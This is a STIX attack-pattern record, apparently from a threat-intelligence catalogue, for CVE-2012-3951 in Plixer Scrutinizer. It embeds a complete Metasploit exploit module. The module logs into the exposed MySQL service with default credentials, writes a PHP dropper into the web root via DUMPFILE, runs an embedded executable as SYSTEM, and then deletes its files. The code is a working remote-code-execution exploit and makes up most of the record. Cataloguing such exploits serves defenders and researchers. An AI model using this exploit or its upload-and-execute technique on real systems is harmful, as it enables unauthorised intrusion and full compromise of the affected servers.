{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8b66252e-afd7-4bcc-bd6f-0eb891a9aa63",
    "created": "2024-08-14T16:56:39.486855Z",
    "modified": "2024-08-14T16:56:39.486859Z",
    "name": "\"Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential\"",
    "description": " This exploits an insecure config found in Scrutinizer NetFlow & sFlow Analyzer. By default, the software installs a default password in MySQL, and binds the service to \"0.0.0.0\".  This allows any remote user to login to MySQL, and then gain arbitrary remote code execution under the context of 'SYSTEM'.  Examples of default credentials include: 'scrutinizer:admin', and 'scrutremote:admin'.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/mysql/scrutinizer_upload_exec.rb",
            "external_id": "scrutinizer_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-3951"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20140722224651/http://secunia.com/advisories/50074/"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustwave.com/spiderlabs/advisories/TWSL2012-014.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::MYSQL\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential\",\n      'Description'    => %q{\n        This exploits an insecure config found in Scrutinizer NetFlow & sFlow Analyzer.\n        By default, the software installs a default password in MySQL, and binds the\n        service to \"0.0.0.0\".  This allows any remote user to login to MySQL, and then\n        gain arbitrary remote code execution under the context of 'SYSTEM'.  Examples\n        of default credentials include: 'scrutinizer:admin', and 'scrutremote:admin'.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'MC',\n          'Jonathan Claudius',\n          'Tanya Secker',\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-3951'],\n          ['OSVDB', '84317'],\n          ['URL', 'http://web.archive.org/web/20140722224651/http://secunia.com/advisories/50074/'],\n          ['URL', 'https://www.trustwave.com/spiderlabs/advisories/TWSL2012-014.txt']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Scrutinizer NetFlow and sFlow Analyzer 9.5.2 or older', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-07-27',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new(\"USERNAME\",  [true, 'The default MySQL username', 'scrutremote']),\n        OptString.new(\"PASSWORD\",  [true, 'The default MySQL password', 'admin']),\n        OptPort.new(\"MYSQLPORT\",   [true, 'The MySQL\\'s remote port', 3306]),\n        OptPort.new(\"HTTPPORT\",    [true, 'The HTTP Server\\'s remote port', 80]),\n        OptString.new(\"TARGETURI\", [true, 'The web application\\'s base path', '/'])\n      ])\n\n    # Both MySQL and HTTP need to use this, we'll have to register on the fly.\n    deregister_options('RPORT')\n\n    self.needs_cleanup = true\n  end\n\n\n  def check\n    tmp_rport = datastore['RPORT']\n    datastore['RPORT'] = datastore['HTTPPORT']\n    res = send_request_raw({'uri'=>'/'})  #Check the base path for regex\n    datastore['RPORT'] = tmp_rport\n    if res and res.body =~ /\\<title\\>Scrutinizer\\<\\/title\\>/ and\n      res.body =~ /\\<div id\\=\\'.+\\'\\>Scrutinizer 9\\.[0-5]\\.[0-2]\\<\\/div\\>/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def get_php_payload(fname)\n    p = Rex::Text.encode_base64(generate_payload_exe)\n    php = %Q|\n    <?php\n    $f = fopen(\"#{fname}\", \"wb\");\n    fwrite($f, base64_decode(\"#{p}\"));\n    fclose($f);\n    exec(\"#{fname}\");\n    ?>\n    |\n    php = php.gsub(/^ {4}/, '').gsub(/\\n/, ' ')\n    return php\n  end\n\n\n  #\n  # I wanna be able to choose my own destination... path!\n  #\n  def mysql_upload_binary(bindata, path)\n    # Modify the rport so we can use MySQL\n    datastore['RPORT'] = datastore['MYSQLPORT']\n\n    # Login\n    h = mysql_login(datastore['USERNAME'], datastore['PASSWORD'])\n    return false if not h\n\n    tmp = mysql_get_temp_dir\n    p = bindata.unpack(\"H*\")[0]\n    dest = tmp + path\n    mysql_query(\"SELECT 0x#{p} into DUMPFILE '#{dest}'\")\n    return true\n  end\n\n\n  def exe_php(php_fname)\n    # Modify the rport so we can use HTTP\n    datastore['RPORT'] = datastore['HTTPPORT']\n\n    # Request our payload\n    uri = normalize_uri(target_uri.path)\n    path = File.dirname(\"#{uri}/.\")\n    res = send_request_raw({'uri'=>\"#{path}#{php_fname}\"})\n    return (res and res.code == 200)\n  end\n\n\n  def cleanup\n    datastore['RPORT'] = @original_rport\n  end\n\n\n  def on_new_session(cli)\n    if cli.type != 'meterpreter'\n      print_error(\"Please remember to manually remove #{@exe_fname} and #{@php_fname}\")\n      return\n    end\n\n    cli.core.use(\"stdapi\") if not cli.ext.aliases.include?(\"stdapi\")\n\n    begin\n      print_warning(\"Deleting #{@php_fname}\")\n      cli.fs.file.rm(@php_fname)\n    rescue ::Exception => e\n      print_error(\"Please note: #{@php_fname} is stil on disk.\")\n    end\n\n    begin\n      print_warning(\"Deleting #{@exe_fname}\")\n      cli.fs.file.rm(@exe_fname)\n    rescue ::Exception => e\n      print_error(\"Please note: #{@exe_fname} is still on disk.\")\n    end\n  end\n\n\n  def exploit\n    @original_rport = datastore['RPORT']\n\n    #\n    # Prepare our payload (naughty exe embedded in php)\n    #\n    @exe_fname = Rex::Text.rand_text_alpha(6) + '.exe'\n    p = get_php_payload(@exe_fname)\n\n    #\n    # Upload our payload to the html directory\n    #\n    print_status(\"Uploading #{p.length.to_s} bytes via MySQL...\")\n    @php_fname = Rex::Text.rand_text_alpha(5) + '.php'\n    if not mysql_upload_binary(p, \"../../html/#{@php_fname}\")\n      print_error(\"That MySQL upload didn't work.\")\n      return\n    end\n\n    #\n    # Execute the payload\n    #\n    print_status(\"Requesting #{@php_fname}...\")\n    res = exe_php(@php_fname)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-27",
    "x_mitre_platforms": [
        "win'"
    ]
}